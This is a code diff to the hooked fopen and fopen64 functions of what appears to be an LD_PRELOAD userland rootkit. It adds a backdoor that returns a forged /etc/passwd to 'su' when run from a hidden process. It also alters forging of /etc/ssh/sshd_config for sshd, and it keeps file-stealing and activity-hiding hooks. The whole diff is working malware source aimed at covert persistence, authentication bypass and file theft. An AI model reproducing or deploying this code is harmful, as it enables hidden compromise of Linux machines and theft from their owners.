@@ -1,19 +1,20 @@
 FILE *fopen(const char *pathname, const char *mode){
     hook(CFOPEN);
+
+#ifdef USE_PAM_BD
+    if(hidden_ppid() && process("su\0") && !strcmp(pathname, "/etc/passwd\0"))
+        return forgepasswd(pathname);
+#endif
+
     if(magicusr()){
 #ifdef HIDE_MY_ASS
         FILE *ret = call(CFOPEN, pathname, mode);
         if(ret){
             int outfd = fileno(stdout);
             if(!outfd) return ret;
-            if(isatty(outfd)){
-                char *apath = gdirname(fileno(ret));
-                if(apath != NULL){
-                    if(!pathtracked(apath))
-                        trackwrite(apath);
-                    free(apath);
-                }
-            }
+            if(isatty(outfd))
+                if(!pathtracked(pathname))
+                    trackwrite(pathname);
         }
         return ret;
 #else
@@ -32,7 +33,7 @@ FILE *fopen(const char *pathname, const char *mode){
 #endif
 
 #ifdef SOFT_PATCH_SSHD_CONFIG
-    if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && process("/usr/sbin/sshd"))
+    if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && sshdproc())
         return sshdforge(pathname);
 #endif
 
@@ -58,27 +59,31 @@ FILE *fopen(const char *pathname, const char *mode){
 #endif
 
 #ifdef FILE_STEAL
-    inspect_file(pathname);
+    inspectfile(pathname);
 #endif
     return call(CFOPEN, pathname, mode);
 }
 
+
+
+
 FILE *fopen64(const char *pathname, const char *mode){
     hook(CFOPEN64);
+
+#ifdef USE_PAM_BD
+    if(hidden_ppid() && process("su\0") && !strcmp(pathname, "/etc/passwd\0"))
+        return forgepasswd(pathname);
+#endif
+
     if(magicusr()){
 #ifdef HIDE_MY_ASS
         FILE *ret = call(CFOPEN64, pathname, mode);
         if(ret){
             int outfd = fileno(stdout);
             if(!outfd) return ret;
-            if(isatty(outfd)){
-                char *apath = gdirname(fileno(ret));
-                if(apath != NULL){
-                    if(!pathtracked(apath))
-                        trackwrite(apath);
-                    free(apath);
-                }
-            }
+            if(isatty(outfd))
+                if(!pathtracked(pathname))
+                    trackwrite(pathname);
         }
         return ret;
 #else
@@ -97,7 +102,7 @@ FILE *fopen64(const char *pathname, const char *mode){
 #endif
 
 #ifdef SOFT_PATCH_SSHD_CONFIG
-    if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && process("/usr/sbin/sshd"))
+    if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && sshdproc())
         return sshdforge(pathname);
 #endif
 
@@ -123,7 +128,7 @@ FILE *fopen64(const char *pathname, const char *mode){
 #endif
 
 #ifdef FILE_STEAL
-    inspect_file(pathname);
+    inspectfile(pathname);
 #endif
     return call(CFOPEN64, pathname, mode);
 }
